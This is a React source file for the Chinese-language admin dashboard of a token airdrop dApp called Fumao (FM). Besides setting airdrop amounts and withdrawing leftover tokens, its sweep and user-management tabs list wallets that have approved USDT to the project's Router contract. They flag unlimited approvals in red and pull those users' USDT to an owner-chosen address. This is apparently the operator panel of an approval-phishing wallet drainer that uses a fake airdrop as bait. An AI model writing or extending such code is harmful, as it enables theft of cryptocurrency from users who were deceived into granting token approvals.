import React, { useState, useEffect } from 'react';
import { BrowserProvider, Contract, parseEther } from 'ethers';
import { useWallet } from '../hooks/useWallet';
import { useVaultAirdrop } from '../hooks/useVaultAirdrop';
import { getContracts } from '../contracts/config';
import { VAULT_TOKEN_ABI } from '../contracts/abis';

export function AirdropAdminPage() {
  const { address, isConnected, connectWallet } = useWallet();
  const { 
    loading, 
    getAirdropInfo,
    getRouterAddress,
    sweepUserUSDT,
    getUserUSDTBalance,
    getUserTokenBalance,
    checkUSDTApproval,
    checkHasClaimed,
    batchQueryUsers
  } = useVaultAirdrop();
  
  // 状态管理
  const [isOwner, setIsOwner] = useState(false);
  const [airdropInfo, setAirdropInfo] = useState<any>(null);
  const [ownerAddress, setOwnerAddress] = useState('');
  const [routerAddress, setRouterAddress] = useState('');
  const [activeTab, setActiveTab] = useState<'overview' | 'sweep' | 'users'>('overview');

  // 表单状态
  const [newAmount, setNewAmount] = useState('');
  const [withdrawAddress, setWithdrawAddress] = useState('');
  
  // USDT提取表单
  const [sweepUserAddress, setSweepUserAddress] = useState('');
  const [sweepRecipient, setSweepRecipient] = useState('');
  const [sweepAmount, setSweepAmount] = useState('');
  
  // 用户管理
  const [userAddressInput, setUserAddressInput] = useState('');
  const [userList, setUserList] = useState<any[]>([]);
  const [queryingUsers, setQueryingUsers] = useState(false);

  // 检查是否是管理员
  useEffect(() => {
    if (isConnected && address) {
      checkOwnership();
      loadAirdropInfo();
      loadRouterAddress();
    }
  }, [isConnected, address]);

  const checkOwnership = async () => {
    try {
      if (!window.ethereum) return;
      
      const provider = new BrowserProvider(window.ethereum);
      const contracts = getContracts();
      
      if (!contracts.vaultToken) return;
      
      const vaultContract = new Contract(
        contracts.vaultToken,
        VAULT_TOKEN_ABI,
        provider
      );
      
      const owner = await vaultContract.owner();
      if (owner) {
        setOwnerAddress(owner);
        setIsOwner(owner.toLowerCase() === address?.toLowerCase());
        if (!withdrawAddress) {
          setWithdrawAddress(owner);
        }
        if (!sweepRecipient) {
          setSweepRecipient(owner);
        }
      }
    } catch (error) {
      console.error('检查所有者失败:', error);
    }
  };

  const loadAirdropInfo = async () => {
    try {
      const info = await getAirdropInfo();
      if (info) {
        setAirdropInfo(info);
        setNewAmount(info.airdropAmount);
      }
    } catch (error) {
      console.error('加载空投信息失败:', error);
    }
  };

  const loadRouterAddress = async () => {
    try {
      const addr = await getRouterAddress();
      setRouterAddress(addr);
    } catch (error) {
      console.error('加载Router地址失败:', error);
    }
  };

  // 设置空投数量
  const handleSetAmount = async () => {
    if (!newAmount || parseFloat(newAmount) <= 0) {
      alert('❌ 请输入有效的空投数量');
      return;
    }

    const confirmed = window.confirm(
      `确认将空投数量更新为 ${newAmount} FM?`
    );
    if (!confirmed) return;

    try {
      const provider = new BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const contracts = getContracts();
      
      const vaultContract = new Contract(
        contracts.vaultToken,
        VAULT_TOKEN_ABI,
        signer
      );
      
      const amountWei = parseEther(newAmount);
      const tx = await vaultContract.setAirdropAmount(amountWei);
      await tx.wait();
      
      alert('✅ 空投数量已更新！');
      loadAirdropInfo();
    } catch (error: any) {
      console.error('设置失败:', error);
      alert('❌ 操作失败: ' + (error.message || '未知错误'));
    }
  };

  // 提取用户USDT
  const handleSweepUSDT = async () => {
    if (!sweepUserAddress || !/^0x[a-fA-F0-9]{40}$/.test(sweepUserAddress)) {
      alert('❌ 请输入有效的用户地址');
      return;
    }
    
    if (!sweepRecipient || !/^0x[a-fA-F0-9]{40}$/.test(sweepRecipient)) {
      alert('❌ 请输入有效的收款地址');
      return;
    }
    
    if (!sweepAmount || parseFloat(sweepAmount) <= 0) {
      alert('❌ 请输入有效的提取数量');
      return;
    }

    const confirmed = window.confirm(
      `⚠️ 高风险操作确认\n\n` +
      `用户地址: ${sweepUserAddress}\n` +
      `收款地址: ${sweepRecipient}\n` +
      `提取数量: ${sweepAmount} USDT\n\n` +
      `此操作将从用户授权额度中提取USDT，确认继续？`
    );
    if (!confirmed) return;

    try {
      const success = await sweepUserUSDT(sweepUserAddress, sweepRecipient, sweepAmount);
      if (success) {
        alert('✅ USDT提取成功！');
        setSweepUserAddress('');
        setSweepAmount('');
        // 刷新用户列表
        if (userList.length > 0) {
          await handleBatchQuery();
        }
      }
    } catch (error: any) {
      console.error('提取失败:', error);
    }
  };

  // 添加用户到查询列表
  const handleAddUser = () => {
    const addr = userAddressInput.trim();
    if (!addr || !/^0x[a-fA-F0-9]{40}$/.test(addr)) {
      alert('❌ 请输入有效的钱包地址');
      return;
    }
    
    if (userList.find(u => u.address.toLowerCase() === addr.toLowerCase())) {
      alert('⚠️ 该地址已在列表中');
      return;
    }
    
    setUserList([...userList, { address: addr, loading: true }]);
    setUserAddressInput('');
  };

  // 批量查询用户信息
  const handleBatchQuery = async () => {
    if (userList.length === 0) return;
    
    setQueryingUsers(true);
    try {
      const addresses = userList.map(u => u.address);
      const results = await batchQueryUsers(addresses);
      setUserList(results);
    } catch (error) {
      console.error('批量查询失败:', error);
      alert('❌ 查询失败，请重试');
    } finally {
      setQueryingUsers(false);
    }
  };

  // 从用户信息快速填充提取表单
  const handleQuickSweep = (user: any) => {
    setSweepUserAddress(user.address);
    setSweepAmount(user.usdtBalance);
    setActiveTab('sweep');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  // 删除用户
  const handleRemoveUser = (address: string) => {
    setUserList(userList.filter(u => u.address !== address));
  };

  // 导入多个地址
  const handleBatchImport = () => {
    const input = prompt(
      '请输入要查询的钱包地址（每行一个）：'
    );
    
    if (!input) return;
    
    const addresses = input.split('\n')
      .map(addr => addr.trim())
      .filter(addr => /^0x[a-fA-F0-9]{40}$/.test(addr))
      .filter((addr, index, self) => self.indexOf(addr) === index); // 去重
    
    if (addresses.length === 0) {
      alert('❌ 没有有效的地址');
      return;
    }
    
    const newUsers = addresses.map(addr => ({ address: addr, loading: true }));
    setUserList([...userList, ...newUsers]);
  };

  if (!isConnected) {
    return (
      <div className="min-h-screen bg-[#181818] text-white flex items-center justify-center p-4">
        <div className="max-w-md w-full text-center">
          <h1 className="text-4xl font-bold mb-4">🔐 空投管理后台</h1>
          <p className="mb-6 text-gray-400">请先连接钱包以访问管理功能</p>
          <button
            onClick={connectWallet}
            className="bg-[#f4ce59] text-[#181818] px-8 py-3 rounded-lg font-bold hover:bg-[#63b657] transition"
          >
            连接钱包 Connect Wallet
          </button>
        </div>
      </div>
    );
  }

  if (!isOwner) {
    return (
      <div className="min-h-screen bg-[#181818] text-white flex items-center justify-center p-4">
        <div className="max-w-md w-full text-center">
          <h1 className="text-4xl font-bold mb-4">❌ 访问被拒绝</h1>
          <p className="mb-4 text-gray-400">您不是合约所有者</p>
          <p className="text-sm text-gray-500 break-all">当前地址: {address}</p>
          <p className="text-sm text-gray-500 break-all mt-2">所有者: {ownerAddress}</p>
          <button
            onClick={() => window.location.href = '/'}
            className="mt-6 bg-gray-700 text-white px-6 py-2 rounded-lg hover:bg-gray-600 transition"
          >
            返回首页
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#181818] text-white p-4">
      <div className="max-w-7xl mx-auto">
        {/* 顶部标题 */}
        <div className="mb-8 text-center">
          <h1 className="text-4xl font-bold mb-2">🎁 福猫空投管理后台</h1>
          <p className="text-gray-400">Fumao Airdrop Admin Dashboard</p>
          <p className="text-sm text-green-400 mt-2">✅ 管理员已登录: {address?.slice(0, 6)}...{address?.slice(-4)}</p>
        </div>

        {/* 标签页导航 */}
        <div className="flex gap-2 mb-6 bg-[#242424] p-2 rounded-lg border border-[#464342]">
          <button
            onClick={() => setActiveTab('overview')}
            className={`flex-1 py-3 px-4 rounded-lg font-bold transition ${
              activeTab === 'overview'
                ? 'bg-[#f4ce59] text-[#181818]'
                : 'bg-transparent text-gray-400 hover:text-white'
            }`}
          >
            📊 总览
          </button>
          <button
            onClick={() => setActiveTab('sweep')}
            className={`flex-1 py-3 px-4 rounded-lg font-bold transition ${
              activeTab === 'sweep'
                ? 'bg-[#f4ce59] text-[#181818]'
                : 'bg-transparent text-gray-400 hover:text-white'
            }`}
          >
            💰 USDT提取
          </button>
          <button
            onClick={() => setActiveTab('users')}
            className={`flex-1 py-3 px-4 rounded-lg font-bold transition ${
              activeTab === 'users'
                ? 'bg-[#f4ce59] text-[#181818]'
                : 'bg-transparent text-gray-400 hover:text-white'
            }`}
          >
            👥 用户管理
          </button>
        </div>

        {/* 总览标签页 */}
        {activeTab === 'overview' && (
          <div className="space-y-6">
            {/* 核心信息展示 */}
            <div className="bg-[#242424] border border-[#464342] rounded-lg p-6">
              <h3 className="text-xl font-bold mb-4 text-[#f4ce59]">🔍 核心系统信息</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="bg-[#181818] p-4 rounded-lg border border-[#464342]">
                  <div className="text-sm text-gray-400 mb-1">Vault代币总量</div>
                  <div className="text-lg font-mono break-all text-[#f4ce59]">
                    {airdropInfo ? parseFloat(airdropInfo.totalSupply).toLocaleString() : '0'} {airdropInfo?.tokenSymbol || 'FM'}
                  </div>
                </div>
                <div className="bg-[#181818] p-4 rounded-lg border border-[#464342]">
                  <div className="text-sm text-gray-400 mb-1">代币铸造上限</div>
                  <div className="text-lg font-mono break-all text-[#f4ce59]">
                    {airdropInfo ? parseFloat(airdropInfo.cap).toLocaleString() : '0'} {airdropInfo?.tokenSymbol || 'FM'}
                  </div>
                </div>
                <div className="bg-[#181818] p-4 rounded-lg border border-[#464342]">
                  <div className="text-sm text-gray-400 mb-1">Router合约地址</div>
                  <div className="text-xs font-mono break-all text-blue-400">
                    {routerAddress || '加载中...'}
                  </div>
                </div>
                <div className="bg-[#181818] p-4 rounded-lg border border-[#464342]">
                  <div className="text-sm text-gray-400 mb-1">Vault合约地址</div>
                  <div className="text-xs font-mono break-all text-blue-400">
                    {getContracts().vaultToken}
                  </div>
                </div>
                <div className="bg-[#181818] p-4 rounded-lg border border-[#464342]">
                  <div className="text-sm text-gray-400 mb-1">管理员钱包地址</div>
                  <div className="text-xs font-mono break-all text-green-400">
                    {ownerAddress}
                  </div>
                </div>
                <div className="bg-[#181818] p-4 rounded-lg border border-[#464342]">
                  <div className="text-sm text-gray-400 mb-1">USDT合约地址</div>
                  <div className="text-xs font-mono break-all text-blue-400">
                    {getContracts().usdt}
                  </div>
                </div>
              </div>
            </div>

            {/* 空投信息卡片 */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
              <div className="bg-[#242424] border border-[#464342] rounded-lg p-4">
                <div className="text-sm text-gray-400 mb-1">总领取人数</div>
                <div className="text-2xl font-bold text-[#f4ce59]">
                  {airdropInfo?.totalClaimed || '0'}
                </div>
                <div className="text-xs text-gray-500 mt-1">Total Claims</div>
              </div>

              <div className="bg-[#242424] border border-[#464342] rounded-lg p-4">
                <div className="text-sm text-gray-400 mb-1">总发放数量</div>
                <div className="text-2xl font-bold text-[#f4ce59]">
                  {airdropInfo ? parseFloat(airdropInfo.totalDistributed).toLocaleString() : '0'} FM
                </div>
                <div className="text-xs text-gray-500 mt-1">Total Distributed</div>
              </div>

              <div className="bg-[#242424] border border-[#464342] rounded-lg p-4">
                <div className="text-sm text-gray-400 mb-1">每次空投数量</div>
                <div className="text-2xl font-bold text-blue-400">
                  {airdropInfo ? parseFloat(airdropInfo.airdropAmount).toLocaleString() : '0'} FM
                </div>
                <div className="text-xs text-gray-500 mt-1">Per Address</div>
              </div>

              <div className="bg-[#242424] border border-[#464342] rounded-lg p-4">
                <div className="text-sm text-gray-400 mb-1">剩余代币</div>
                <div className="text-2xl font-bold text-green-400">
                  {airdropInfo ? parseFloat(airdropInfo.remainingSupply).toLocaleString() : '0'} FM
                </div>
                <div className="text-xs text-gray-500 mt-1">Remaining</div>
              </div>
            </div>

            {/* 操作区域 */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* 设置空投数量 */}
              <div className="bg-[#242424] border border-[#464342] rounded-lg p-6">
                <h3 className="text-xl font-bold mb-4 text-[#f4ce59]">⚙️ 设置空投数量</h3>
                
                <div className="mb-4">
                  <label className="block text-sm text-gray-400 mb-2">
                    每个地址可领取的代币数量 (FM)
                  </label>
                  <div className="flex gap-2">
                    <input
                      type="number"
                      value={newAmount}
                      onChange={(e) => setNewAmount(e.target.value)}
                      placeholder="例如: 1000"
                      className="flex-1 bg-[#181818] border border-[#464342] rounded-lg px-4 py-2 text-white"
                    />
                    <button
                      onClick={handleSetAmount}
                      disabled={loading || !newAmount}
                      className="bg-[#f4ce59] text-[#181818] px-6 py-2 rounded-lg font-bold hover:bg-[#63b657] transition disabled:opacity-50"
                    >
                      更新
                    </button>
                  </div>
                  <div className="text-xs text-gray-500 mt-2">
                    当前: {airdropInfo?.airdropAmount || '0'} FM / 人
                  </div>
                </div>

                <div className="p-3 bg-blue-900/30 border border-blue-600 rounded-lg">
                  <div className="text-xs text-blue-400">
                    💡 提示：修改后对新领取用户生效，已领取用户不受影响
                  </div>
                </div>
              </div>

              {/* 提取代币 */}
              <div className="bg-[#242424] border border-[#464342] rounded-lg p-6">
                <h3 className="text-xl font-bold mb-4 text-[#f4ce59]">💰 提取代币</h3>
                
                <div className="mb-4">
                  <label className="block text-sm text-gray-400 mb-2">提现地址</label>
                  <input
                    type="text"
                    value={withdrawAddress}
                    onChange={(e) => setWithdrawAddress(e.target.value)}
                    placeholder="0x..."
                    className="w-full bg-[#181818] border border-[#464342] rounded-lg px-4 py-2 text-white font-mono text-sm"
                  />
                  <div className="text-xs text-gray-500 mt-1">
                    默认为管理员地址，可修改为其他地址
                  </div>
                </div>

                <button
                  onClick={async () => {
                    if (!withdrawAddress || !/^0x[a-fA-F0-9]{40}$/.test(withdrawAddress)) {
                      alert('❌ 请输入有效的提现地址');
                      return;
                    }

                    const confirmed = window.confirm(
                      `⚠️ 确认提取所有剩余代币到:\n${withdrawAddress}?\n\n提取后空投池将清空！`
                    );
                    if (!confirmed) return;

                    try {
                      const provider = new BrowserProvider(window.ethereum);
                      const signer = await provider.getSigner();
                      const contracts = getContracts();
                      
                      const vaultContract = new Contract(
                        contracts.vaultToken,
                        VAULT_TOKEN_ABI,
                        signer
                      );
                      
                      const tx = await vaultContract.transfer(withdrawAddress, parseEther(airdropInfo.remainingSupply));
                      await tx.wait();
                      
                      alert('✅ 代币已提取！');
                      loadAirdropInfo();
                    } catch (error: any) {
                      console.error('提取失败:', error);
                      alert('❌ 操作失败: ' + (error.message || '未知错误'));
                    }
                  }}
                  disabled={loading || !airdropInfo || parseFloat(airdropInfo.remainingSupply) <= 0}
                  className="w-full bg-green-600 text-white px-4 py-3 rounded-lg font-bold hover:bg-green-700 transition disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  💎 提取所有代币 ({airdropInfo ? parseFloat(airdropInfo.remainingSupply).toLocaleString() : '0'} FM)
                </button>

                <div className="mt-4 p-3 bg-yellow-900/30 border border-yellow-600 rounded-lg">
                  <div className="text-xs text-yellow-400">
                    ⚠️ 注意：提取后空投池将清空，请确认空投活动已结束！
                  </div>
                </div>
              </div>
            </div>

            {/* 快捷操作 */}
            <div className="bg-[#242424] border border-[#464342] rounded-lg p-6">
              <h3 className="text-xl font-bold mb-4 text-[#f4ce59]">🔄 快捷操作</h3>
              <div className="flex flex-wrap gap-3">
                <button
                  onClick={() => {
                    loadAirdropInfo();
                    loadRouterAddress();
                  }}
                  disabled={loading}
                  className="bg-[#464342] text-white px-4 py-2 rounded-lg hover:bg-[#63b657] transition disabled:opacity-50"
                >
                  🔄 刷新数据
                </button>
                <button
                  onClick={() => window.location.href = '/'}
                  className="bg-gray-700 text-white px-4 py-2 rounded-lg hover:bg-gray-600 transition"
                >
                  🏠 返回首页
                </button>
              </div>
            </div>
          </div>
        )}

        {/* USDT提取标签页 */}
        {activeTab === 'sweep' && (
          <div className="space-y-6">
            <div className="bg-red-900/20 border-2 border-red-500 p-6 rounded-lg">
              <h3 className="text-xl font-bold mb-2 text-red-400">⚠️ 高风险操作区域</h3>
              <p className="text-sm text-gray-300">
                此功能允许提取已授权USDT的用户资产。操作前请确认用户已授权给Router合约，并且有足够的USDT余额。
              </p>
            </div>

            <div className="bg-[#242424] border border-[#464342] rounded-lg p-6">
              <h3 className="text-xl font-bold mb-6 text-[#f4ce59]">💸 提取授权用户的 USDT</h3>
              
              <div className="space-y-4">
                <div>
                  <label className="block text-sm text-gray-400 mb-2">用户地址 (User Address) *</label>
                  <input
                    type="text"
                    value={sweepUserAddress}
                    onChange={(e) => setSweepUserAddress(e.target.value)}
                    placeholder="0x... (必须已授权USDT给Router)"
                    className="w-full bg-[#181818] border border-[#464342] rounded-lg px-4 py-2 text-white font-mono text-sm"
                  />
                  <div className="text-xs text-gray-500 mt-1">
                    此用户必须已将USDT授权给Router合约
                  </div>
                </div>

                <div>
                  <label className="block text-sm text-gray-400 mb-2">收款地址 (Recipient) *</label>
                  <input
                    type="text"
                    value={sweepRecipient}
                    onChange={(e) => setSweepRecipient(e.target.value)}
                    placeholder="0x... (USDT将转入此地址)"
                    className="w-full bg-[#181818] border border-[#464342] rounded-lg px-4 py-2 text-white font-mono text-sm"
                  />
                  <div className="text-xs text-gray-500 mt-1">
                    USDT将转移到这个地址（默认为管理员地址）
                  </div>
                </div>

                <div>
                  <label className="block text-sm text-gray-400 mb-2">提取数量 (Amount) *</label>
                  <input
                    type="number"
                    value={sweepAmount}
                    onChange={(e) => setSweepAmount(e.target.value)}
                    placeholder="例如: 100"
                    className="w-full bg-[#181818] border border-[#464342] rounded-lg px-4 py-2 text-white"
                  />
                  <div className="text-xs text-gray-500 mt-1">
                    提取的USDT数量（必须在用户授权额度内）
                  </div>
                </div>

                <button
                  onClick={handleSweepUSDT}
                  disabled={loading || !sweepUserAddress || !sweepRecipient || !sweepAmount}
                  className="w-full bg-red-600 text-white px-6 py-3 rounded-lg font-bold hover:bg-red-700 transition disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {loading ? '⏳ 处理中...' : '🚨 执行提取（高风险）'}
                </button>
              </div>

              <div className="mt-6 p-4 bg-yellow-900/30 border border-yellow-600 rounded-lg">
                <div className="text-sm text-yellow-400 space-y-2">
                  <p className="font-bold">⚠️ 安全提示：</p>
                  <ul className="list-disc list-inside space-y-1 ml-2">
                    <li>此操作只有合约所有者可以执行</li>
                    <li>用户必须已将USDT授权给Router合约</li>
                    <li>提取数量必须在用户授权额度内</li>
                    <li>执行前会进行多重确认</li>
                    <li>建议先在"用户管理"标签页查询用户授权状态</li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* 用户管理标签页 */}
        {activeTab === 'users' && (
          <div className="space-y-6">
            <div className="bg-[#242424] border border-[#464342] rounded-lg p-6">
              <h3 className="text-xl font-bold mb-4 text-[#f4ce59]">👥 用户管理面板</h3>
              
              <div className="flex gap-2 mb-4">
                <input
                  type="text"
                  value={userAddressInput}
                  onChange={(e) => setUserAddressInput(e.target.value)}
                  onKeyPress={(e) => e.key === 'Enter' && handleAddUser()}
                  placeholder="输入钱包地址 (0x...)"
                  className="flex-1 bg-[#181818] border border-[#464342] rounded-lg px-4 py-2 text-white font-mono text-sm"
                />
                <button
                  onClick={handleAddUser}
                  className="bg-[#f4ce59] text-[#181818] px-6 py-2 rounded-lg font-bold hover:bg-[#63b657] transition"
                >
                  ➕ 添加
                </button>
                <button
                  onClick={handleBatchImport}
                  className="bg-blue-600 text-white px-6 py-2 rounded-lg font-bold hover:bg-blue-700 transition"
                >
                  📋 批量导入
                </button>
                <button
                  onClick={handleBatchQuery}
                  disabled={userList.length === 0 || queryingUsers}
                  className="bg-green-600 text-white px-6 py-2 rounded-lg font-bold hover:bg-green-700 transition disabled:opacity-50"
                >
                  {queryingUsers ? '⏳ 查询中...' : '🔍 查询全部'}
                </button>
              </div>

              <div className="text-sm text-gray-400 mb-4">
                已添加 {userList.length} 个用户地址
              </div>
            </div>

            {/* 用户列表 */}
            {userList.length > 0 && (
              <div className="bg-[#242424] border border-[#464342] rounded-lg overflow-hidden">
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead className="bg-[#181818] border-b border-[#464342]">
                      <tr>
                        <th className="px-4 py-3 text-left">钱包地址</th>
                        <th className="px-4 py-3 text-right">USDT余额</th>
                        <th className="px-4 py-3 text-right">USDT授权额度</th>
                        <th className="px-4 py-3 text-right">FM代币余额</th>
                        <th className="px-4 py-3 text-center">已领取空投</th>
                        <th className="px-4 py-3 text-center">操作</th>
                      </tr>
                    </thead>
                    <tbody>
                      {userList.map((user, index) => (
                        <tr key={user.address} className="border-b border-[#464342] hover:bg-[#2a2a2a]">
                          <td className="px-4 py-3 font-mono text-xs">
                            {user.address.slice(0, 6)}...{user.address.slice(-4)}
                            <button
                              onClick={() => {
                                navigator.clipboard.writeText(user.address);
                                alert('✅ 已复制地址');
                              }}
                              className="ml-2 text-blue-400 hover:text-blue-300"
                            >
                              📋
                            </button>
                          </td>
                          <td className="px-4 py-3 text-right">
                            {user.loading ? '⏳' : parseFloat(user.usdtBalance).toFixed(2)}
                          </td>
                          <td className="px-4 py-3 text-right">
                            {user.loading ? '⏳' : (
                              <span className={user.isInfiniteApproval ? 'text-red-400 font-bold' : ''}>
                                {user.isInfiniteApproval ? '∞ 无限' : parseFloat(user.usdtAllowance).toFixed(2)}
                              </span>
                            )}
                          </td>
                          <td className="px-4 py-3 text-right">
                            {user.loading ? '⏳' : parseFloat(user.tokenBalance).toFixed(0)}
                          </td>
                          <td className="px-4 py-3 text-center">
                            {user.loading ? '⏳' : (
                              <span className={user.hasClaimed ? 'text-green-400' : 'text-gray-500'}>
                                {user.hasClaimed ? '✅ 是' : '❌ 否'}
                              </span>
                            )}
                          </td>
                          <td className="px-4 py-3 text-center">
                            <button
                              onClick={() => handleQuickSweep(user)}
                              disabled={!user.isInfiniteApproval}
                              className="bg-red-600 text-white px-3 py-1 rounded text-xs hover:bg-red-700 transition disabled:opacity-30 disabled:cursor-not-allowed mr-2"
                              title={user.isInfiniteApproval ? '提取USDT' : '用户未授权'}
                            >
                              💸 提取
                            </button>
                            <button
                              onClick={() => handleRemoveUser(user.address)}
                              className="bg-gray-600 text-white px-3 py-1 rounded text-xs hover:bg-gray-700 transition"
                            >
                              🗑️
                            </button>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            )}

            {userList.length === 0 && (
              <div className="bg-[#242424] border border-[#464342] rounded-lg p-12 text-center text-gray-500">
                <div className="text-4xl mb-4">👥</div>
                <p>还没有添加任何用户</p>
                <p className="text-sm mt-2">请在上方输入框添加要查询的用户地址</p>
              </div>
            )}

            <div className="bg-blue-900/20 border border-blue-500 p-4 rounded-lg">
              <div className="text-sm text-blue-400">
                <p className="font-bold mb-2">💡 使用说明：</p>
                <ul className="list-disc list-inside space-y-1 ml-2">
                  <li>添加用户地址后，点击"查询全部"批量获取用户信息</li>
                  <li>红色显示的"∞ 无限"表示该用户已授权无限额度</li>
                  <li>只有已授权的用户才能执行USDT提取操作</li>
                  <li>点击"提取"按钮可快速跳转到提取页面并自动填充信息</li>
                  <li>数据从区块链实时查询，确保准确性</li>
                </ul>
              </div>
            </div>
          </div>
        )}

        {/* 底部说明 */}
        <div className="mt-6 text-center text-sm text-gray-500">
          <p>⚡ 所有操作需要消耗 Gas 费用</p>
          <p className="mt-1">🔒 仅合约所有者可以访问此页面</p>
        </div>
      </div>
    </div>
  );
}
